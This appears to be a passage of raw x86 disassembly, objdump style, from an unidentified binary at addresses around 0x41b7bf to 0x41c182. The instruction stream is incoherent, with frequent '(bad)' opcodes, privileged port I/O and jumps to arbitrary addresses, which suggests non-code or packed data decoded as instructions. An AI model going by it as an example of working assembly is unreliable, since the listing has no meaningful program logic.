  41b7bf:	aam    0x2
  41b7c1:	xor    al,0xff
  41b7c3:	in     eax,0x6b
  41b7c5:	dec    eax
  41b7c6:	(bad)  
  41b7c7:	call   0xea0124da
  41b7cc:	add    BYTE PTR cs:[eax],al
  41b7cf:	out    dx,al
  41b7d0:	push   edx
  41b7d1:	mov    ah,0xff
  41b7d3:	call   0x3abd37e6
  41b7d8:	push   cs
  41b7d9:	add    eax,0xe1f83
  41b7de:	add    BYTE PTR [ebx+0x5c8ad509],dl
  41b7e4:	je     0x41b85c
  41b7e6:	std    
  41b7e7:	push   cs
  41b7e8:	ss push 0xffffffe2
	...
  41b807:	add    BYTE PTR [eax],al
  41b809:	add    BYTE PTR [ebx],dl
  41b80b:	clc    
  41b80c:	xchg   al,dh
  41b80e:	cld    
  41b80f:	adc    BYTE PTR [ebp+0x1],ch
  41b812:	je     0x41b83f
  41b814:	add    al,0x73
  41b816:	ja     0x41b87d
  41b818:	call   FWORD PTR [esi+0x1]
  41b81b:	repnz rol DWORD PTR [ecx],1
  41b81e:	jmp    FWORD PTR fs:[ecx+0x14]
  41b822:	and    al,0x66
  41b824:	std    
  41b825:	mov    WORD PTR [ecx+0x64],?
  41b828:	cld    
  41b829:	call   DWORD PTR [ebx+0x7f]
  41b82c:	enter  0x3cff,0x8b
  41b830:	sbb    BYTE PTR [ecx],al
  41b832:	xor    al,0x80
  41b834:	ror    BYTE PTR [edi],0xe2
  41b837:	xchg   ebp,eax
  41b838:	add    BYTE PTR [eax],al
  41b83a:	and    al,0x7e
  41b83c:	sti    
  41b83d:	add    bl,BYTE PTR [ecx]
  41b83f:	inc    edx
  41b840:	mov    dh,BYTE PTR [ebp-0x5150c]
  41b846:	mov    esp,0x240000a1
  41b84b:	out    0xf2,eax
  41b84d:	mov    eax,0x8588ff24
  41b852:	or     al,0xeb
  41b854:	cli    
  41b855:	jmp    DWORD PTR [edi+eax*4]
  41b858:	(bad)  
  41b859:	push   eax
  41b85a:	pop    edi
  41b85b:	pusha  
  41b85c:	push   eax
  41b85d:	(bad)  
  41b85e:	(bad)  
  41b860:	push   ebp
  41b861:	(bad)  
  41b862:	jmp    0xf481ca99
  41b867:	dec    esi
  41b868:	or     BYTE PTR [si-0x317b],ch
  41b86d:	call   0x41b872
	...
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	mov    edi,0x38fffaea
  41b891:	mov    esp,0x41611370
  41b896:	mov    ebp,0xfc675ce8
  41b89b:	(bad)  
  41b89c:	aas    
  41b89d:	in     al,dx
  41b89e:	xor    dh,0xd
  41b8a1:	xchg   esp,eax
  41b8a2:	pop    ecx
  41b8a3:	out    0x9c,eax
  41b8a5:	add    dh,BYTE PTR [ebp-0x3]
  41b8a8:	mov    bl,dh
  41b8aa:	inc    eax
  41b8ab:	call   0xfdb8474c
  41b8b0:	je     0x41b919
  41b8b2:	(bad)  
  41b8b3:	dec    DWORD PTR ds:0x174e6
  41b8b9:	inc    BYTE PTR [esi+0x7652a9b3]
  41b8bf:	std    
  41b8c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8c1:	xchg   ecx,eax
  41b8c2:	add    DWORD PTR [eax],eax
  41b8c4:	or     eax,0xdb89541
  41b8c9:	imul   ecx,DWORD PTR [eax+0x76b1e583],0x3addddfd
  41b8d3:	jmp    0x68c18c46
  41b8d8:	cmp    bl,BYTE PTR [ecx+0xb325076]
  41b8de:	or     al,0x8b
  41b8e0:	nop
  41b8e1:	in     al,dx
  41b8e2:	je     0x41b8e1
  41b8e4:	and    bh,BYTE PTR [eax]
  41b8e6:	ins    BYTE PTR es:[edi],dx
  41b8e7:	lock sahf 
  41b8e9:	push   0x614d8301
  41b8ee:	nop
  41b8ef:	rol    BYTE PTR [eax],0x0
	...
  41b90e:	xchg   ecx,eax
  41b90f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b910:	lock push es
  41b912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b914:	fild   DWORD PTR [esi-0x28a8470]
  41b91a:	repnz mov al,ds:0x67eaff63
  41b920:	mov    BYTE PTR [ebx-0x28a324d],al
  41b926:	shl    DWORD PTR [edi+0x1],cl
  41b929:	inc    eax
  41b92a:	inc    esp
  41b92b:	lods   al,BYTE PTR ds:[esi]
  41b92c:	jl     0x41b8f4
  41b92e:	push   eax
  41b92f:	ss add al,0x89
  41b932:	push   cs
  41b933:	out    0x68,al
  41b935:	or     al,0x5d
  41b937:	add    BYTE PTR [edx+eax*8+0x6],dh
  41b93b:	shr    BYTE PTR [ebx-0x8],1
  41b93e:	call   0xe7d0:0xf76b272d
  41b945:	add    edx,DWORD PTR [ecx-0x768009c0]
  41b94b:	jmp    esi
  41b94d:	add    edi,DWORD PTR [ecx+esi*2]
  41b950:	mov    BYTE PTR fs:[ecx+0x72],bh
  41b954:	out    dx,al
  41b955:	jne    0x41b993
  41b957:	push   0x71
  41b959:	sar    BYTE PTR [edi],0x90
  41b95c:	iret   
  41b95d:	adc    BYTE PTR [edx],al
  41b95f:	jmp    esi
  41b961:	mov    ebp,0x80e33f8d
  41b966:	pop    ebx
  41b967:	adc    BYTE PTR [ecx],bh
  41b969:	data16 sbb al,0x40
  41b96c:	inc    ebp
  41b96d:	mov    ecx,DWORD PTR [edx-0x7c]
  41b970:	and    al,0x58
	...
  41b98e:	add    BYTE PTR [eax],al
  41b990:	shl    ch,cl
  41b992:	out    0xcc,eax
  41b994:	xchg   DWORD PTR [ebx+0x71307883],eax
  41b99a:	pop    edi
  41b99b:	add    ecx,DWORD PTR ds:0xd2d36700
  41b9a1:	cmp    BYTE PTR [esp+ebx*2],ah
  41b9a4:	adc    DWORD PTR [eax],eax
  41b9a6:	out    0x3,eax
  41b9a8:	mov    bh,BYTE PTR [ebx+0x70db819a]
  41b9ae:	jbe    0x41b9bf
  41b9b0:	inc    ecx
  41b9b1:	adc    BYTE PTR [edi],ah
  41b9b3:	add    al,0x8e
  41b9b5:	aas    
  41b9b6:	fmul   st(1),st
  41b9b8:	xchg   DWORD PTR [edx-0x45682bc2],edi
  41b9be:	mov    ss,esp
  41b9c0:	cmp    ecx,ecx
  41b9c2:	pop    ebx
  41b9c3:	jg     0x41b9a6
  41b9c5:	jno    0x41ba0d
  41b9c7:	jne    0x41ba06
  41b9c9:	jno    0x41b97f
  41b9cb:	push   edi
  41b9cc:	enter  0xa,0xf1
  41b9d0:	push   ds
  41b9d1:	sar    bh,0x2d
  41b9d4:	stos   BYTE PTR es:[edi],al
  41b9d5:	push   esp
  41b9d6:	sub    DWORD PTR [ecx],0x8
  41b9d9:	mov    esp,0xd204172
  41b9de:	sbb    al,0xf9
  41b9e0:	into   
  41b9e1:	jo     0x41b965
  41b9e3:	prefetch (bad)
  41b9e4:	or     eax,0x95c01bed
  41b9e9:	clc    
  41b9ea:	or     al,0x65
  41b9ec:	push   cs
  41b9ed:	jno    0x41b9ec
  41b9ef:	jmp    0xe8b283ea
	...
  41ba10:	add    BYTE PTR [eax],al
  41ba12:	push   cs
  41ba13:	xchg   DWORD PTR [ecx-0xf],ecx
  41ba16:	or     eax,0xd922b7c5
  41ba1b:	add    al,BYTE PTR [ebp+0xec7]
  41ba21:	bound  esp,QWORD PTR [ebx-0x8]
  41ba24:	mov    BYTE PTR [ecx+ebp*8],bh
  41ba27:	cmp    DWORD PTR [ebx-0x3e],eax
  41ba2a:	ja     0x6cc3ba31
  41ba30:	add    DWORD PTR [ecx-0xa0c0b73],edx
  41ba36:	or     DWORD PTR [edi-0x27],edi
  41ba39:	pushf  
  41ba3a:	mov    eax,ds:0xb12c8972
  41ba3f:	add    dh,BYTE PTR [ebp-0x27e4d7]
  41ba45:	call   0x7e917a58
  41ba4a:	stc    
  41ba4b:	das    
  41ba4c:	mov    edx,DWORD PTR [ebx*2+0x110e5058]
  41ba53:	add    BYTE PTR [ecx-0x204478cf],cl
  41ba59:	fs push edi
  41ba5b:	std    
  41ba5c:	sbb    DWORD PTR [eax+0x6200000e],0xffffffc3
  41ba63:	push   ebx
  41ba64:	xor    DWORD PTR [eax],eax
  41ba66:	and    al,0x7a
  41ba68:	inc    ecx
  41ba69:	hlt    
  41ba6a:	pop    edi
  41ba6b:	inc    BYTE PTR [esi+0x5e93711]
  41ba71:	jb     0x41ba3d
  41ba73:	sub    bh,cl
  41ba75:	ja     0x41ba77
	...
  41ba93:	add    BYTE PTR [esi],cl
  41ba95:	fidivr WORD PTR [esp+eax*1]
  41ba98:	mov    ch,0x5e
  41ba9a:	or     BYTE PTR [ebx],ch
  41ba9c:	fdivp  st(7),st
  41ba9e:	leave  
  41ba9f:	cmp    edi,0x6c
  41baa2:	jo     0x41ba8a
  41baa4:	(bad)  
  41baa5:	stc    
  41baa6:	mov    BYTE PTR [ecx+0x72],al
  41baa9:	jp     0x41baec
  41baab:	hlt    
  41baac:	jmp    0x241b1f1
  41bab1:	fild   QWORD PTR [esi]
  41bab3:	leave  
  41bab4:	sub    al,0x41
  41bab6:	clc    
  41bab7:	psraw  mm0,mm4
  41baba:	test   BYTE PTR [ebp-0x6c],cl
  41babd:	int3   
  41babe:	(bad)  
  41babf:	sbb    BYTE PTR [ebp+0x3],ah
  41bac2:	push   esi
  41bac3:	call   DWORD PTR [ecx]
  41bac5:	fadd   DWORD PTR [ebp+eax*2+0x312ecc90]
  41bacc:	xor    eax,0x444d8703
  41bad1:	in     eax,dx
  41bad2:	dec    eax
  41bad3:	mov    al,0xbf
  41bad5:	inc    eax
  41bad6:	shl    DWORD PTR [ebx],1
  41bad8:	dec    edi
  41bad9:	in     eax,dx
  41bada:	inc    eax
  41badb:	test   al,0xad
  41badd:	push   0xa7f989a9
  41bae2:	xor    eax,0x268c05d
  41bae7:	cmp    DWORD PTR [ecx],ebp
  41bae9:	call   0xc600bf5e
  41baee:	jo     0x41bafa
  41baf0:	pop    ecx
  41baf1:	imul   ebx,DWORD PTR [ebp+0x12fae8],0x0
	...
  41bb13:	add    BYTE PTR [eax],al
  41bb15:	add    BYTE PTR [edi],bh
  41bb17:	sub    esi,DWORD PTR ds:0xf6cd0d5d
  41bb1d:	inc    esi
  41bb1e:	xchg   BYTE PTR [ebp+0x30663f2d],cl
  41bb24:	or     al,0x8b
  41bb26:	inc    edx
  41bb27:	add    DWORD PTR [ecx+eax*8-0xe],ebx
  41bb2b:	push   edi
  41bb2c:	add    DWORD PTR [ebp+ecx*8+0x4288e8b4],eax
  41bb33:	gs jle 0x41baf5
  41bb36:	sbb    DWORD PTR ss:[ecx+eax*1],ecx
  41bb3a:	or     ebx,DWORD PTR [eax-0x7d26b284]
  41bb40:	or     DWORD PTR [ebx+0x4fd2b940],ecx
  41bb46:	jne    0x41bb01
  41bb48:	xor    edi,edi
  41bb4a:	add    BYTE PTR [ecx],0x5
  41bb4d:	mov    eax,edi
  41bb4f:	pusha  
  41bb50:	jle    0x41bb95
  41bb52:	gs icebp 
  41bb54:	add    BYTE PTR [edi],ah
  41bb56:	sar    BYTE PTR [esp+eax*1],1
  41bb59:	inc    ebx
  41bb5a:	jne    0x41bb35
  41bb5c:	out    dx,eax
  41bb5d:	jmp    0x41bb64
  41bb5f:	dec    esi
  41bb60:	xchg   BYTE PTR [ecx],cl
  41bb62:	push   ecx
  41bb63:	inc    ebp
  41bb64:	jb     0x41bb4f
  41bb66:	aad    0xad
  41bb68:	cli    
  41bb69:	aaa    
  41bb6a:	xchg   esi,eax
  41bb6b:	sbb    eax,0x4d49e830
  41bb70:	add    DWORD PTR [eax],eax
  41bb72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb73:	add    BYTE PTR [edi+0x43],bh
  41bb76:	ins    DWORD PTR es:[edi],dx
  41bb77:	sub    BYTE PTR [ebx+0x5d],bh
	...
  41bb96:	add    BYTE PTR [eax],al
  41bb98:	loope  0x41bb1a
  41bb9a:	mov    eax,ds:0x7c590c30
  41bb9f:	inc    ebp
  41bba0:	aad    0x41
  41bba2:	inc    esi
  41bba3:	je     0x41bbb5
  41bba5:	out    dx,al
  41bba6:	leave  
  41bba7:	cmp    esi,esi
  41bba9:	cmp    al,BYTE PTR [eax-0x6b80528d]
  41bbaf:	or     eax,0x5ee7000d
  41bbb4:	add    bh,BYTE PTR [ebx-0x2c]
  41bbb7:	mov    ds:0x3e685f5,eax
  41bbbc:	or     eax,0x842bd66d
  41bbc1:	lds    eax,FWORD PTR [edx]
  41bbc3:	pop    esp
  41bbc4:	sahf   
  41bbc5:	std    
  41bbc6:	out    0x3,al
  41bbc8:	mov    cl,ch
  41bbca:	out    dx,al
  41bbcb:	jl     0x41bc25
  41bbcd:	sub    al,0x2e
  41bbcf:	clc    
  41bbd0:	jbe    0x41bc2a
  41bbd2:	and    ah,BYTE PTR [edx]
  41bbd4:	stos   BYTE PTR es:[edi],al
  41bbd5:	ins    DWORD PTR es:[edi],dx
  41bbd6:	fiadd  DWORD PTR [ebx-0x1c]
  41bbd9:	(bad)  
  41bbda:	ror    BYTE PTR [esi],cl
  41bbdc:	int    0x75
  41bbde:	das    
  41bbdf:	shl    BYTE PTR [eax],cl
  41bbe1:	leave  
  41bbe2:	das    
  41bbe3:	inc    ebp
  41bbe4:	adc    DWORD PTR [eax],eax
  41bbe6:	xchg   esp,eax
  41bbe7:	jle    0x41bc5a
  41bbe9:	add    DWORD PTR [ebx],0x95d5ddcb
  41bbef:	jle    0x41bbe7
  41bbf1:	div    DWORD PTR [ecx-0x37]
  41bbf4:	sub    al,BYTE PTR [ebx-0x3d76fe59]
  41bbfa:	call   0x41bc02
	...
  41bc17:	add    BYTE PTR [eax],al
  41bc19:	add    BYTE PTR ds:0xd1c4e81,cl
  41bc1f:	std    
  41bc20:	push   0x2c
  41bc22:	verr   di
  41bc25:	fild   DWORD PTR [edx+0x6d]
  41bc28:	out    0x13,eax
  41bc2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc2b:	jae    0x41bc41
  41bc2d:	add    al,0xd
  41bc2f:	shl    BYTE PTR [ebx-0x31],1
  41bc32:	inc    edx
  41bc33:	pop    eax
  41bc34:	xchg   bh,cl
  41bc36:	and    ch,BYTE PTR [ebp+0x6a]
  41bc39:	out    0x3e,eax
  41bc3b:	add    BYTE PTR [edx+0x74],ah
  41bc3e:	test   bl,al
  41bc40:	sahf   
  41bc41:	aam    0x95
  41bc43:	cmp    eax,0xffcac7a5
  41bc48:	call   FWORD PTR [edi-0x2e]
  41bc4b:	cmp    BYTE PTR [edi+0x3f585ef4],al
  41bc51:	rcr    DWORD PTR [ebp+0x6b],1
  41bc54:	test   BYTE PTR [ecx],ch
  41bc56:	or     al,0x84
  41bc58:	cli    
  41bc59:	call   0x2972bc6c
  41bc5e:	mov    dh,BYTE PTR [ebp+0x74]
  41bc61:	test   BYTE PTR [esi+0x15b4002d],0xc0
  41bc68:	jg     0x41bc21
  41bc6a:	(bad)  
  41bc6c:	je     0x41bc58
  41bc6e:	les    edx,FWORD PTR [edi-0x11]
  41bc71:	int3   
  41bc72:	sldt   WORD PTR [eax]
  41bc75:	imul   esi,DWORD PTR [esi-0x2695b7ff],0xde406d
	...
  41bc9b:	add    BYTE PTR [ebx+0xee8ff4e],cl
  41bca1:	inc    esi
  41bca2:	inc    ebx
  41bca3:	add    cl,BYTE PTR [ecx]
  41bca5:	push   edi
  41bca6:	xor    BYTE PTR [edx+edx*2+0x44],ah
  41bcaa:	call   0xfdad0e0c
  41bcaf:	jo     0x41bd04
  41bcb1:	pusha  
  41bcb2:	sub    DWORD PTR [ecx-0x17547bf3],0xe
  41bcb9:	add    ch,bh
  41bcbb:	push   esi
  41bcbc:	or     eax,0x20ad3377
  41bcc1:	sar    bh,0xbd
  41bcc4:	inc    ebp
  41bcc5:	add    al,0x51
  41bcc7:	mov    dh,0xd4
  41bcc9:	iret   
  41bcca:	xor    BYTE PTR [ecx+0x6e836b1],ch
  41bcd0:	mov    dh,0x6a
  41bcd2:	std    
  41bcd3:	gs into 
  41bcd5:	lock adc BYTE PTR [ebx+edx*2+0x44],ah
  41bcda:	call   0xfdacee0c
  41bcdf:	add    BYTE PTR [edi-0x49],bh
  41bce2:	sbb    bl,0xf9
  41bce5:	(bad)
  41bce8:	in     eax,0xff
  41bcea:	jmp    FWORD PTR [ecx-0x36]
  41bced:	dec    ebp
  41bcee:	dec    DWORD PTR [ecx+edi*4-0x4400b011]
  41bcf5:	and    eax,DWORD PTR [edi-0x4e33f3b9]
  41bcfb:	sbb    ch,ah
  41bcfd:	inc    DWORD PTR [ebp+eax*2+0x0]
	...
  41bd1c:	add    BYTE PTR [eax],al
  41bd1e:	push   esp
  41bd1f:	test   al,bh
  41bd21:	push   DWORD PTR [ebx-0x5bfea17d]
  41bd27:	jmp    FWORD PTR [ecx+0x3b]
  41bd2a:	into   
  41bd2b:	add    eax,0x4f4c4589
  41bd30:	cld    
  41bd31:	jne    0x41bd3b
  41bd33:	lock aad 0xff
  41bd36:	jns    0x41bd1b
  41bd38:	out    0x91,eax
  41bd3a:	pushf  
  41bd3b:	(bad)  
  41bd3c:	dec    DWORD PTR [eax-0x7811c47]
  41bd42:	sub    DWORD PTR [ebx-0x7f],0x32
  41bd46:	gs (bad) 
  41bd48:	dec    DWORD PTR [edx-0x24d0f855]
  41bd4e:	das    
  41bd4f:	mov    edi,0x50dd0570
  41bd54:	icebp  
  41bd55:	jmp    0x41bdc3
  41bd57:	(bad)  
  41bd58:	popf   
  41bd59:	cs inc DWORD PTR gs:[ebp+eax*2-0x763fd078]
  41bd62:	and    esp,ecx
  41bd64:	xor    al,0x45
  41bd66:	js     0x41bdd3
  41bd68:	add    DWORD PTR [ebx],0x88ffff25
  41bd6e:	stc    
  41bd6f:	fbstp  TBYTE PTR [eax*2-0x337c946c]
  41bd76:	or     eax,0x86000159
  41bd7b:	adc    al,0x60
  41bd7d:	mov    DWORD PTR [eax-0x17],edx
  41bd80:	cmp    BYTE PTR [eax+eax*1],0x0
	...
  41bda0:	mov    ebp,0xa883fe58
  41bda5:	pop    eax
  41bda6:	add    DWORD PTR [eax],eax
  41bda8:	xchg   BYTE PTR [ecx+esi*4-0x76],ah
  41bdac:	adc    eax,0x890d3add
  41bdb1:	js     0x41bdb7
  41bdb3:	add    BYTE PTR ds:0x5e96d06,cl
  41bdb9:	in     eax,0x3a
  41bdbb:	je     0x41bdd1
  41bdbd:	call   0x3b6a:0xd9050c77
  41bdc4:	inc    eax
  41bdc5:	es xor eax,eax
  41bdc8:	test   BYTE PTR [ebx-0x2afc8b3],ah
  41bdce:	cmc    
  41bdcf:	push   eax
  41bdd0:	xchg   esi,eax
  41bdd1:	fwait
  41bdd2:	dec    ecx
  41bdd3:	mov    edx,DWORD PTR [ecx]
  41bdd5:	fadd   DWORD PTR [eax+0x2d950d38]
  41bddb:	mov    DWORD PTR ds:0xf9002bd9,ecx
  41bde1:	mov    bl,0x7a
  41bde3:	dec    ebx
  41bde4:	jge    0x41bdc3
  41bde6:	imul   ebx,ebp
  41bde9:	add    BYTE PTR [esi+0x43],0xb5
  41bded:	and    DWORD PTR [edx],ebx
  41bdef:	xchg   eax,ecx
  41bdf1:	jl     0x41be61
  41bdf3:	adc    edx,DWORD PTR [ecx+0x66]
  41bdf6:	sar    edi,0x81
  41bdf9:	or     ebx,DWORD PTR [edi+eax*4+0x5b7be8d0]
  41be00:	jns    0x41bdf1
  41be02:	out    dx,eax
  41be03:	mov    bh,0x0
	...
  41be21:	add    BYTE PTR [edx+0x1b],dl
  41be24:	dec    eax
  41be25:	add    DWORD PTR ds:0xa6e80159,ecx
  41be2b:	inc    DWORD PTR ds:0x3c770d05
  41be31:	pop    esp
  41be32:	xchg   ecx,eax
  41be33:	aas    
  41be34:	sbb    al,0x2b
  41be36:	test   ah,al
  41be38:	stos   BYTE PTR es:[edi],al
  41be39:	ret    
  41be3a:	xchg   ebx,eax
  41be3b:	ret    
  41be3c:	mov    ds:0xf9644e2a,al
  41be41:	mov    al,ds:0xfbfb458e
  41be46:	test   ebx,eax
  41be48:	jb     0x41be8f
  41be4a:	adc    ebp,edi
  41be4c:	or     al,0xc3
  41be4e:	xchg   ebp,eax
  41be4f:	ret    
  41be50:	push   esi
  41be51:	outs   dx,BYTE PTR ds:[esi]
  41be52:	and    DWORD PTR [eax+0xec91856],esi
  41be58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be59:	add    edx,DWORD PTR [ebx+edi*4+0x34c1d336]
  41be60:	js     0x41bedc
  41be62:	inc    esi
  41be63:	je     0x41be4f
  41be65:	cmp    al,BYTE PTR [edx+0x58]
  41be68:	repnz sbb eax,0x4bea69aa
  41be6e:	mov    cl,bl
  41be70:	push   cs
  41be71:	jp     0x41be89
  41be73:	clc    
  41be74:	adc    eax,0xa475a6c8
  41be79:	pop    edi
  41be7a:	inc    esp
  41be7b:	ret    
  41be7c:	push   es
  41be7d:	dec    BYTE PTR [esp+esi*1+0x25786dfe]
  41be84:	xchg   esi,eax
  41be85:	sbb    eax,DWORD PTR [eax]
	...
  41bea3:	add    dh,bh
  41bea5:	cmc    
  41bea6:	in     eax,dx
  41bea7:	neg    DWORD PTR [esi+0x58]
  41beaa:	ret    0x621f
  41bead:	imul   edx,edx,0x5c458e10
  41beb3:	stc    
  41beb4:	push   ecx
  41beb5:	repz rcr BYTE PTR [esi+edx*2+0x1b],cl
  41beba:	call   0xb30ce0c2
  41bebf:	jns    0x41be8f
  41bec1:	jae    0x41bec3
  41bec3:	pusha  
  41bec4:	dec    eax
  41bec5:	sbb    eax,0x42090e87
  41beca:	inc    ebx
  41becb:	mov    ds:0x8543770e,al
  41bed0:	xchg   esp,eax
  41bed1:	in     al,0xd7
  41bed3:	adc    ebx,0x85e8ff14
  41bed9:	mov    ebp,0x58f272df
  41bede:	call   0xfdaad98d
  41bee3:	fs cli 
  41bee5:	inc    eax
  41bee6:	call   0xfdadafac
  41beeb:	jae    0x41beb7
  41beed:	addr16 jmp 0xc82f1ae6
  41bef3:	inc    ecx
  41bef4:	add    al,0xe2
  41bef6:	cld    
  41bef7:	dec    esi
  41bef8:	(bad)  
  41bef9:	aas    
  41befa:	pop    ebp
  41befb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41befc:	aad    0x41
  41befe:	ret    0xee5
  41bf01:	int    0x88
  41bf03:	inc    ebp
  41bf04:	mov    ds,WORD PTR [ebx+0x20]
  41bf07:	loope  0x41bf09
	...
  41bf25:	add    BYTE PTR [esi],cl
  41bf27:	add    BYTE PTR [ecx+0x5100368c],al
  41bf2d:	mov    bh,0xc1
  41bf2f:	loopne 0x41bf20
  41bf31:	and    cl,ah
  41bf33:	push   0x6b01a4c3
  41bf38:	std    
  41bf39:	fcom   QWORD PTR [esi]
  41bf3b:	push   cs
  41bf3c:	inc    eax
  41bf3d:	jmp    0xab0dbaf1
  41bf42:	push   cs
  41bf43:	ja     0x41bf78
  41bf45:	loope  0x41bf71
  41bf47:	mov    edi,0x584b6fff
  41bf4c:	and    ecx,0x6233575a
  41bf52:	or     BYTE PTR [edi-0x8],bh
  41bf55:	fnstsw WORD PTR [edi+ebp*1]
  41bf58:	cmp    DWORD PTR [eax],eax
  41bf5a:	icebp  
  41bf5b:	repz jb 0x41bf8c
  41bf5e:	add    BYTE PTR [edx+0x1],0x1
  41bf62:	lock sti 
  41bf64:	xchg   BYTE PTR [ebp+0x2c],bl
  41bf67:	fld    TBYTE PTR [esi+0xc]
  41bf6a:	cdq    
  41bf6b:	inc    edx
  41bf6c:	or     edi,edi
  41bf6e:	imul   DWORD PTR [ebx+0x30]
  41bf71:	call   esp
  41bf73:	retf   
  41bf74:	sbb    edx,ebx
  41bf76:	hlt    
  41bf77:	add    eax,DWORD PTR [ecx-0x779df240]
  41bf7d:	push   es
  41bf7e:	fnstsw WORD PTR [esi]
  41bf80:	in     eax,dx
  41bf81:	add    esi,DWORD PTR [eax+eax*4+0x79]
  41bf85:	lock enter 0x70ea,0xe8
	...
  41bfa6:	add    BYTE PTR [eax],al
  41bfa8:	(bad)  
  41bfa9:	mov    ebp,0x4bdc5d86
  41bfae:	in     eax,dx
  41bfaf:	retf   
  41bfb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfb1:	add    edi,ebx
  41bfb3:	adc    eax,0x4011b8
  41bfb8:	aas    
  41bfb9:	inc    eax
  41bfba:	cmp    eax,0x8163e485
  41bfbf:	fldenv [ebp-0x4b97fffd]
  41bfc5:	add    eax,DWORD PTR [eax]
  41bfc7:	adc    BYTE PTR [eax+esi*8+0x50],bh
  41bfcb:	add    BYTE PTR [ebx+edx*2-0x3517a276],ah
  41bfd2:	sbb    al,0x5b
  41bfd4:	je     0x41bfd9
  41bfd6:	xchg   DWORD PTR [ebp+0x38],ecx
  41bfd9:	and    BYTE PTR [ecx-0x38],0x64
  41bfdd:	jmp    0xc6c7:0xe895c048
  41bfe4:	mov    cl,0x97
  41bfe6:	add    BYTE PTR [ecx+0x7de7c031],cl
  41bfec:	rcr    edx,1
  41bfee:	cli    
  41bfef:	test   BYTE PTR ds:0xa783f999,cl
  41bff5:	pop    eax
  41bff6:	add    DWORD PTR [eax],eax
  41bff8:	xor    al,0xd6
  41bffa:	add    al,BYTE PTR [eax]
  41bffc:	or     eax,0x805d04d3
  41c001:	in     al,0x61
  41c003:	cmc    
  41c004:	sub    dl,BYTE PTR [esi-0x61be39a4]
  41c00a:	imul   ecx,DWORD PTR [ecx+0x0],0x0
	...
  41c028:	add    BYTE PTR [eax],al
  41c02a:	sbb    eax,0xc6a6291
  41c02f:	pop    ecx
  41c030:	and    eax,0xdb5a7e04
  41c035:	add    DWORD PTR [edx-0x14],esp
  41c038:	adc    edx,0x6a01590c
  41c03e:	sbb    DWORD PTR [ecx],ecx
  41c040:	fdivp  st(7),st
  41c042:	cdq    
  41c043:	sub    esi,DWORD PTR [eax]
  41c045:	std    
  41c046:	loop   0x41c025
  41c048:	test   al,cl
  41c04a:	fcmovbe st,st(0)
  41c04c:	fcom   DWORD PTR [ecx]
  41c04e:	or     al,0x59
  41c050:	add    al,0x4b
  41c053:	cmp    DWORD PTR [esi+0x5a40ffd],eax
  41c059:	mov    eax,DWORD PTR [eax-0x4d029634]
  41c05f:	lock mov cl,0x0
  41c062:	or     eax,0x5fc95959
  41c067:	pop    eax
  41c068:	add    DWORD PTR [ebx-0x295b370],ecx
  41c06e:	xchg   edx,eax
  41c06f:	test   al,0x7e
  41c071:	(bad)  
  41c072:	fld    QWORD PTR [ecx]
  41c074:	push   ds
  41c075:	add    DWORD PTR [edx-0x77e70fa7],0x72fbb02b
  41c07f:	ins    DWORD PTR es:[edi],dx
  41c080:	test   eax,0x1590db5
  41c085:	call   0x3dac041
  41c08a:	or     eax,0x2f6475
	...
  41c0ab:	add    BYTE PTR [eax+0x66],dl
  41c0ae:	(bad)  
  41c0af:	rcl    DWORD PTR [ebp-0x69b73dc3],cl
  41c0b5:	jl     0x41c0b2
  41c0b7:	push   0x38
  41c0b9:	popw   ss
  41c0bb:	imul   edi,DWORD PTR [esi+0x498063f7],0x69
  41c0c2:	scas   al,BYTE PTR es:[edi]
  41c0c3:	push   0xffffffbd
  41c0c5:	push   edi
  41c0c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0c7:	fcomp  DWORD PTR [edx]
  41c0c9:	fs inc bx
  41c0cc:	add    BYTE PTR [ebp-0x14328059],cl
  41c0d2:	fbstp  TBYTE PTR [esi]
  41c0d4:	int    0xde
  41c0d6:	outs   dx,DWORD PTR ds:[esi]
  41c0d7:	sbb    cl,0x6a
  41c0da:	jle    0x41c146
  41c0dc:	mov    edx,0xd03e856
  41c0e1:	jae    0x41c147
  41c0e3:	popa   
  41c0e4:	fsub   DWORD PTR [ebp+0x66]
  41c0e7:	inc    ecx
  41c0e8:	or     eax,0x5fbca700
  41c0ed:	addr16 (bad) 
  41c0ef:	shl    BYTE PTR [edx-0x55792087],0xf4
  41c0f6:	imul   eax,DWORD PTR [ebx+0x9],0x367896cf
  41c0fd:	mov    dl,bh
  41c0ff:	inc    ebx
  41c100:	mov    ch,0x27
  41c102:	nop
  41c103:	add    al,0xd
  41c105:	jl     0x41c12e
  41c107:	out    dx,eax
  41c108:	dec    esp
  41c109:	jae    0x41c177
  41c10b:	mov    bh,0x90
  41c10d:	gs push ss
  41c10f:	add    BYTE PTR ss:[eax],al
	...
  41c12e:	cmp    DWORD PTR [edx-0x5d],0x30
  41c132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c133:	pop    eax
  41c134:	rcl    BYTE PTR [esi],1
  41c136:	jp     0x41c19d
  41c138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c139:	xchg   BYTE PTR [edx-0xb960004],dh
  41c13f:	(bad)  
  41c141:	call   FWORD PTR [eax]
  41c143:	inc    eax
  41c144:	data16 jo 0x41c155
  41c147:	pop    eax
  41c148:	retf   
  41c149:	dec    esp
  41c14a:	push   cs
  41c14b:	add    BYTE PTR [edi+0x3d9c12c],al
  41c151:	pop    esp
  41c152:	adc    BYTE PTR [ebp+0x50],0x53
  41c156:	or     eax,0xa72d8379
  41c15b:	(bad)  
  41c15c:	std    
  41c15d:	sbb    DWORD PTR [edx-0x4b4c2380],esp
  41c163:	bound  edx,QWORD PTR [eax-0x6f]
  41c166:	mov    esi,es
  41c168:	(bad)  
  41c169:	call   0x9734a524
  41c16e:	je     0x41c1cd
  41c170:	xchg   esi,eax
  41c171:	(bad)  
  41c172:	je     0x41c1d7
  41c174:	mov    ch,dh
  41c176:	xor    al,BYTE PTR ds:0x192add74
  41c17c:	je     0x41c15b
  41c17e:	xor    al,al
  41c180:	jae    0x41c15f
  41c182:	sub    al,dh
